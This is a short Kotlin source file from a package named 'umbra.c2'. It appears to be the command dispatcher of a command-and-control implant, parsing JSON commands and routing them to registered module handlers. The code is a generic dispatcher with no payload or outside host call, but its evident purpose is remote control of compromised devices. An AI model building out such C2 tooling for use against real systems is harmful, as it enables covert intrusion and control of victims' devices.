package dev.yassine.umbra.c2

import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json

@Serializable
data class Command(
    val cmd_id: String = "",
    val module: String = "",
    val action: String = "",
    val params: Map<String, String> = emptyMap()
)

@Serializable
data class CommandResult(
    val cmd_id: String,
    val status: String,
    val data: String = "",
    val error: String = ""
)

object CommandDispatcher {

    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = false }

    private var handlers: Map<String, suspend (Command) -> String> = emptyMap()

    fun register(moduleHandlers: Map<String, suspend (Command) -> String>) {
        handlers = moduleHandlers
    }

    suspend fun dispatch(raw: String): String {
        return try {
            val cmd = json.decodeFromString<Command>(raw)
            val handler = handlers[cmd.module]
            if (handler != null) {
                handler(cmd)
            } else {
                json.encodeToString(CommandResult.serializer(),
                    CommandResult(cmd.cmd_id, "error", "", "unknown_module:${cmd.module}"))
            }
        } catch (e: Exception) {
            json.encodeToString(CommandResult.serializer(),
                CommandResult("?", "error", "", "parse:${e.message}"))
        }
    }
}
